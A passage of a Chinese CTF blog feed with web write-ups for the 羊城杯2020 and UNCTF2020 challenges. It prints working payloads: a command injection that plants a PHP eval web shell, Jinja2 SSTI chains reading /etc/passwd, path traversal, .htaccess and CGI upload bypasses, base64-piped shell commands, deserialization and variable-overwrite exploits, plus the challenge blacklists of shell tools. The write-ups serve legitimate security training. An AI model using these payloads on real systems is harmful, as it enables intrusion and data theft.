class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $count . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass = <span class="string">&quot;GWHT&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br></pre></td></tr></table></figure><p>读到Cookie是GWHT，接下来就是命令执行<code>exec('printf \'' . $count . '\' | wc -c')</code></p><p>exec命令无回显，可以直接写入shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;| echo &quot;&lt;?&#x3D;eval(\$_POST[&#39;shell&#39;])?&gt;&quot; &gt; shell.php ||&#39;</span><br></pre></td></tr></table></figure><p>另外base64还有一种绕过方式：<code>%6%32</code>，<code>%32</code>是2，拼接成<code>%62</code>就是字母<code>b</code>了。</p><h2 id="BlackCat">BlackCat</h2><p>首页提示你听歌，把MP3下载到本地，用010 Editor打开，文件末尾隐藏着PHP代码</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210224100.png" alt=""></p><p>copy下来放到sublime中审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Ë­£¡¾¹¸Ò²ÈÎÒÒ»Ö»¶úµÄÎ²°Í£¡&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$clandestine = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;White-cat-monitor&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hh = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, $_POST[<span class="string">&#x27;One-ear&#x27;</span>], $clandestine);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ÓÐÒâÃé×¼£¬ÎÞÒâ»÷·¢£¬ÄãµÄÃÎÏë¾ÍÊÇÄãÒªÃé×¼µÄÄ¿±ê¡£ÏàÐÅ×Ô¼º£¬Äã¾ÍÊÇÄÇ¿ÅÉäÖÐ°ÐÐÄµÄ×Óµ¯¡£&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.$_POST[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>中文存在乱码，不过不影响审计过程。<code>hash_mac</code>在官方文档中的第一个Note提到了一个trick：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210224304.png" alt=""></p><p>第二个参数如果是数组的话，那么这个函数会生成一个warning，并且返回NULL，那么相当于<code>$clandetine</code>参数可控。payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">White-cat-monitor[]&#x3D;1&amp;One-ear&#x3D;;cat flag.php&amp;Black-CatSheriff&#x3D;04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;羊城杯2020-Web-Writeup&quot;&gt;羊城杯2020 Web Writeup&lt;/h1&gt;
&lt;p&gt;当时没时间打，现在题目在GitHub上开源了，随便看看。&lt;/p&gt;
&lt;h2 id=&quot;easycon&quot;&gt;easycon&lt;/h2&gt;
&lt;p&gt;蚁剑连接一句话，下载bbbbbbb
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2020-Web-Writeup</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup/</id>
    <published>2020-11-19T05:41:51.000Z</published>
    <updated>2020-11-19T06:09:14.166Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UNCTF2020-Web-wp">UNCTF2020 Web wp</h1><h2 id="easyssrf-solved">easyssrf [solved]</h2><p>算是签到题，比较easy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="easyflask-solved">easyflask [solved]</h2><p>Fuzz了一下，发现过滤挺多东西的。<br>只能用管道+join的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</span><br></pre></td></tr></table></figure><p>等价于<code>().__class__</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base</span><br></pre></td></tr></table></figure><p>等价于<code>().__class__.__base__</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses</span><br></pre></td></tr></table></figure><p><code>().__class__.__base__.subclasses()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)&#125;</span><br></pre></td></tr></table></figure><p><code>().__class__.base__.subclasses().pop(475)</code><br>click.utils.LazyFile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)(request.args.path).read()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>但是不知道flag在哪，所以还是要执行系统命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(64)&#125;&#125;</span><br></pre></td></tr></table></figure><p>选取的模块<code>&lt;class '_frozen_importlib._DummyModuleLock'&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(64)|attr((request.args.usc*2,request.args.init,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.globals,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.builtins,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.import,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;init&#x3D;init&amp;globals&#x3D;globals&amp;builtins&#x3D;builtins&amp;import&#x3D;import</span><br></pre></td></tr></table></figure><p><code>().__class__.base__.subclasses().pop(64).__init__.__globals__.__import__</code><br>还是没能搞出来<br>最后还是通过读文件的方式，首先尝试<code>proc/self/cwd</code>和<code>/proc/self/environ</code>，直接返回500，应该是权限不够，再尝试读取<code>/proc/self/cmdline</code>，显示项目是在<code>/app</code>下面，再看<code>/app/app.py</code>发现可以成功读取源码，那就猜了一波flag应该在这个路径下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;secret_route_you_do_not_know?guess&#x3D;&#123;&#123;(()|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.base,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.subclasses,request.args.usc*2)|join)()).pop(475)(request.args.path).read()&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_&amp;base&#x3D;base&amp;subclasses&#x3D;subclasses&amp;path&#x3D;&#x2F;app&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://www.jianshu.com/p/a736e39c3510">https://www.jianshu.com/p/a736e39c3510</a><br><a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#flask-%E6%94%B9">https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/#flask-改</a><br><a href="https://blog.csdn.net/weixin_43536759/article/details/105066445">https://blog.csdn.net/weixin_43536759/article/details/105066445</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#jinja2---filter-bypass</a></p><p>赛后看预期解我好像做的太麻烦了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;((session|attr(request.headers.x))|attr(request.headers.x1)).get(request.headers.x2).get(request.headers.x3)(request.headers.x4).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>header的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x: __init__</span><br><span class="line">x1: __globals__</span><br><span class="line">x2: __builtins__</span><br><span class="line">x3: open</span><br><span class="line">x4: app.py(flag.txt)</span><br></pre></td></tr></table></figure><h2 id="easyunserialize-solved">easyunserialize [solved]</h2><p>反序列化字符逃逸<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="babyeval-solved">babyeval [solved]</h2><p>命令执行可以直接包含文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;include&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br></pre></td></tr></table></figure><h2 id="easyfind-solved">easyfind [solved]</h2><p>一开始不给hint都没什么思路，后来放了一个hint：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(is_file($name)===<span class="literal">false</span>))&#123;flag&#125;<span class="keyword">else</span>&#123;no flag&#125;</span><br></pre></td></tr></table></figure><p>is_file函数接收一个数组的时候回返回Null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]&#x3D;0</span><br></pre></td></tr></table></figure><h2 id="easy-upload-solved">easy_upload [solved]</h2><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119105131.png" alt=""></p><p>检查文件名后缀、文件类型，过滤了<code>perl|pyth|ph|auto|curl|base|\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet</code>，不检查是否有图片头。</p><p><code>.htaccess</code>文件名是可以上传的，用换行绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddHandler p\</span><br><span class="line">ph5-script .txt</span><br><span class="line">p\</span><br><span class="line">hp_value au\</span><br><span class="line">to_append_file &#x2F;flag</span><br></pre></td></tr></table></figure><p>然后在随便上传一个txt文件，访问对应路径即可。</p><p>然后我写wp的时候发现，这道题目过滤被改了，增加了一个<code>\</code>，所以上面的这种换行绕过就没办法bypass了。</p><p>来学一个新姿势，上传.htaccess，开启cgi支持，上传cgi脚本，执行cgi脚本，输出flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119130328.png" alt=""></p><p>再上传cgi文件，这个文件必须要在Linux/macOS环境下编写，使用vim就行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">echo &quot;Content-Type: text&#x2F;plain&quot;</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>然后上传的时候最好也要直接上传文件，抓包修改文件类型，最后再放包，不然可能会出现500的错误。</p><h2 id="UN’s-online-tools-solved">UN’s_online_tools [solved]</h2><p>命令执行绕过的题目，当前目录下只有index.php，用sort读取源代码，过滤空格和<code>$</code>，用<code>%09</code>来绕过。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119131410.png" alt=""></p><p>从源码中可以看到禁用了<code>/(;|'| |&gt;|]|&amp;| |\\$|\\|rev|more|tailf|head|nl|tail|tac|cat|rm|cp|mv|\*|\&#123;)/i</code></p><p>用ls命令看到flag在根目录下，base64编码一下</p><p><code>127.0.0.1|echo%09Y2F0IC9mbGFn|base64%09-d|sh</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119133907.png" alt=""></p><h2 id="easyphp">easyphp</h2><p>PHP代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$adminPassword = <span class="string">&#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;fuxkSQL&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span>(<span class="params">$iText</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">&#x27;\\\\&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;getVars&#x27;</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> (count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">&#x27;mysql_real_escape_string&#x27;</span>)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>, str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&#x27;&quot;</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you can set config variables!!&#x27;</span> . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . $GLOBALS[$key] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题考点是变量覆盖，弱类型和PHP复杂变量的解析。做出了前两个考点，倒在了第三个考点，没想到用复杂变量。</p><p>第一关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">  <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$&#123;$key&#125;=$value</code>可以导致变量覆盖，也就是说我们将$password覆盖为任意值，然后将$adminPassword覆盖为其md5值。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password&#x3D;ca01h&amp;adminPassword&#x3D;0f5ed8a8d8d44d86a570aacffa922251&amp;source&#x3D;</span><br></pre></td></tr></table></figure><p>第二关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha1($verif) == $verif</span><br></pre></td></tr></table></figure><p>简单的PHP弱类型绕过，payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?verif&#x3D;0e00000000000000000000081614617300000000</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/spaze/hashes">https://github.com/spaze/hashes</a></p></blockquote><p>第三关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="string">&quot;\$<span class="subst">$key</span>&quot;</span> . <span class="string">&#x27;=&quot;&#x27;</span> . $GLOBALS[$key] . <span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量名必须是<code>var1</code>或者<code>var12</code>这种形式，而且在变量覆盖环节转义了单双引号。</p><p>关于复杂变量的解析：<a href="https://ca0y1h.top/Web_security/php_related/11.PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90/">https://ca0y1h.top/Web_security/php_related/11.PHP复杂变量解析/</a></p><p>Payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1=&#123;$_GET[<span class="number">1</span>]&#125;&amp;var3=$&#123;$var1()&#125;&amp;<span class="number">1</span>=phpinfo</span><br></pre></td></tr></table></figure><p>解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var1&#x3D;&quot;&#123;$_GET[1]&#125;&quot;; &#x3D;&#x3D;&gt; $var1&#x3D;&quot;phpinfo&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var3&#x3D;&quot;$&#123;$var1()&#125;&quot;; &#x3D;&#x3D;&gt; $var3&#x3D;&quot;$&#123;phpinfo()&#125;&quot;;</span><br></pre></td></tr></table></figure><h2 id="L0vePHP">L0vePHP</h2><p>查看源码最后一行是一个提示，但是比赛的时候不知道这是base82的编码方式。</p><p>解码之后是让提交一个action参数，提示读源码，用文件包含，base被过滤了，换成rot13。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.string-rot13&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($action)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/base|data|input|zip|zlib/i&quot;</span>, $action)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!!!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$action</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;footer.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $flag = <span class="string">&quot;unctf&#123;7his_is_@_f4ke_f1a9&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hint用十六进制转码<code>1nD3x.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 